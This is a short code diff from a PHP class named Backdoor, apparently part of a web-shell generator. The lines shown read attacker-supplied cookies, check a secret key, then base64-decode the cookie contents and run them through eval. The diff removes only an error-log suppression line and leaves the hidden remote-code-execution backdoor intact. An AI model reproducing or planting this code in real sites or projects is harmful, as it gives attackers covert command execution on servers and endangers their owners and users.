@@ -28,7 +28,6 @@ class Backdoor:
 $c='count';
 $a=$_COOKIE;
 if(reset($a)=='%%%START_KEY%%%' && $c($a)>3){
-ini_set('error_log', '/dev/null');
 $k='%%%END_KEY%%%';
 echo '<'.$k.'>';
 eval(base64_decode(preg_replace(array('/[^\w=\s]/','/\s/'), array('','+'), join(array_slice($a,$c($a)-3)))));
